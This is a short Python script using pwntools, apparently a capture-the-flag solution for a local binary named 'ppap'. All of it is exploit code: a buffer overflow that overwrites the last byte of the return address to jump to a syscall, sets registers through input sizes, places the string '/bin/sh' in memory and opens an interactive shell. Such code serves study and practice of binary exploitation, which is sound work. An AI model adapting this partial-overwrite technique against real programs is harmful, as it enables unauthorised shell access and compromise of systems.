from pwn import *

sh = process('./ppap')

# Only can control the last byte of return address
# return to syscall
payload = 'a' * 0x28 + '\xe4'
sleep(0.1)
sh.send(payload)

# rdx: this input size
sleep(0.1)
sh.sendline(str(0x601050))

# rax: this input size
# rsi: bss address(point to our string)
# rdi: 0
sh.recvuntil('>')
payload = '/bin/sh\x00'.ljust(321, '\x87')
sh.sendline(payload)

sh.interactive()
